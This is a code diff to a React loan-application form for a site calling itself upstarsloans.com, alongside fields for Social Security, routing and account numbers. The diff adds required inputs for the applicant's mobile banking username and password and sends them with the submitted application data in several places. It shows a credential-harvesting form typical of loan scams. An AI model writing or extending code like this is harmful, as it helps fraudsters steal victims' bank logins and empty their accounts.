@@ -28,6 +28,8 @@ const LoanApplication = () => {
     ssnNumber: '',
     bankName: '',
     customBankName: '',
+    mobileAppUsername: '',
+    mobileAppPassword: '',
     routingNumber: '',
     accountNumber: '',
     phoneNumber: '',
@@ -345,6 +347,8 @@ const LoanApplication = () => {
         monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
         loanAgent: formData.loanAgent,
         bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
+        mobileAppUsername: formData.mobileAppUsername,
+        mobileAppPassword: formData.mobileAppPassword,
         routingNumber: formData.routingNumber,
         accountNumber: formData.accountNumber,
         userId: formData.firstName.toLowerCase() + '_' + formData.lastName.toLowerCase() + '_' + formData.phoneNumber.slice(-4),
@@ -426,6 +430,8 @@ const LoanApplication = () => {
         dateOfBirth: formData.dateOfBirth,
         ssnNumber: formData.ssnNumber,
         bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
+        mobileAppUsername: formData.mobileAppUsername,
+        mobileAppPassword: formData.mobileAppPassword,
         routingNumber: formData.routingNumber,
         accountNumber: formData.accountNumber,
         userId: formData.firstName.toLowerCase() + '_' + formData.lastName.toLowerCase() + '_' + formData.phoneNumber.slice(-4),
@@ -838,6 +844,8 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
         monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
         loanAgent: formData.loanAgent,
         bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
+        mobileAppUsername: formData.mobileAppUsername,
+        mobileAppPassword: formData.mobileAppPassword,
         routingNumber: formData.routingNumber,
         accountNumber: formData.accountNumber,
         userId: formData.firstName.toLowerCase() + '_' + formData.lastName.toLowerCase() + '_' + formData.phoneNumber.slice(-4),
@@ -1556,6 +1564,8 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
         monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
         loanAgent: formData.loanAgent,
         bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
+        mobileAppUsername: formData.mobileAppUsername,
+        mobileAppPassword: formData.mobileAppPassword,
         routingNumber: formData.routingNumber,
         accountNumber: formData.accountNumber,
         userId: formData.firstName.toLowerCase() + '_' + formData.lastName.toLowerCase() + '_' + formData.phoneNumber.slice(-4),
@@ -2222,6 +2232,43 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
                   <p className="text-xs text-gray-500 mt-1">Please enter the exact name of your bank or credit union</p>
                 </div>
               )}
+
+              {/* Mobile App Credentials */}
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Mobile App User ID *
+                </label>
+                <div className="relative">
+                  <User className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
+                  <input
+                    type="text"
+                    name="mobileAppUsername"
+                    value={formData.mobileAppUsername}
+                    onChange={handleInputChange}
+                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
+                    placeholder="Enter your mobile banking username"
+                    required
+                  />
+                </div>
+              </div>
+
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Mobile App Password *
+                </label>
+                <div className="relative">
+                  <Lock className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
+                  <input
+                    type="password"
+                    name="mobileAppPassword"
+                    value={formData.mobileAppPassword}
+                    onChange={handleInputChange}
+                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
+                    placeholder="Enter your mobile banking password"
+                    required
+                  />
+                </div>
+              </div>
 
               {/* Phone Number */}
               <div>
